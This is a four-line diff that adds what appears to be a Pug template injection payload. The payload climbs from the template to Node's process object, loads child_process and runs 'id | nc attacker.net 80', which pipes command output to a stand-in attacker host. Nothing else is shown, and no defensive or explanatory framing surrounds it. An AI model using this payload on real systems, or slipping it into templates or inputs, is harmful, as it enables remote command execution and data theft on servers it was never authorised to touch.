@@ -1,0 +1,4 @@
+- var x = root.process
+- x = x.mainModule.require
+- x = x('child_process')
+= x.exec('id | nc attacker.net 80')
